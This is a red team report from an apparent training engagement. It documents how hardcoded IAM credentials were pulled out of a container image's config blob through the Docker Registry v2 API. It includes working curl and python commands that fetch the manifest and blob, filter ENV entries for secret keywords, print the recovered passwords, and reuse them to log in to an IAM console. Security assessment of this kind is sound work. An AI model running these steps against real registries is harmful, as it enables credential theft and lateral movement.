# Red Team Report — CLD01-M04
## Container Registry — IAM Credentials Extracted from Image Config Blob
**Engagement:** Operation GRIDFALL | **Date:** 2024-11-15
**Operator:** [Red Team Operator] | **Target:** cld-registry (11.0.2.40:5000)
**Classification:** TRAINING

---

## Executive Summary

Authenticated to the private container registry using credentials stolen from M3 K8s Secrets. Performed a Registry v2 API image inspection sequence (catalog → tags → manifest → config blob) to extract hardcoded IAM service account credentials from the image's ENV configuration. Credentials successfully authenticated to M5 IAM Console, completing the cloud-to-identity pivot.

---

## Finding: Hardcoded Credentials in Container Image ENV (Critical)

**CWE:** CWE-798 — Use of Hard-coded Credentials
**CVSS v3.1:** 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
**MITRE:** T1552.001

### Proof of Concept

```bash
REGISTRY="11.0.2.40:5000"
CREDS="registry-admin:Reg!stry@CLD2024"

# Step 1 — Get manifest, extract config blob digest
DIGEST=$(curl -s -u "${CREDS}" \
    -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
    "http://${REGISTRY}/v2/pul-cloud/platform-svc/manifests/latest" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['config']['digest'])")

# Step 2 — Pull config blob and dump ENV
curl -s -u "${CREDS}" \
    "http://${REGISTRY}/v2/pul-cloud/platform-svc/blobs/${DIGEST}" \
    | python3 -c "
import sys, json
data = json.load(sys.stdin)
for env in data['config']['Env']:
    if any(k in env for k in ['IAM','PASS','USER','KEY','SECRET','TOKEN']):
        print('[CREDENTIAL]', env)
"
```

### Output — Credentials Confirmed

```
[CREDENTIAL] CLOUD_IAM_URL=http://11.0.2.50:8080
[CREDENTIAL] CLOUD_IAM_USER=cloud-iam-svc
[CREDENTIAL] CLOUD_IAM_PASS=IAm@CLD!2025
```

### Pivot Confirmation

```bash
curl -s -X POST http://11.0.2.50:8080/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"cloud-iam-svc","password":"IAm@CLD!2025"}'
# {"token":"eyJ...","role":"iam_user","username":"cloud-iam-svc"}
```

M5 IAM Console login confirmed. Proceeding to exploit BAC for AD credential extraction.

---

## Artifacts

- Registry access logs: `journalctl -u pul-registry`
- Vulnerable image: `pul-cloud/platform-svc:latest` — config blob ENV array
- Stolen credential: `cloud-iam-svc:IAm@CLD!2025` → M5 (11.0.2.50:8080)
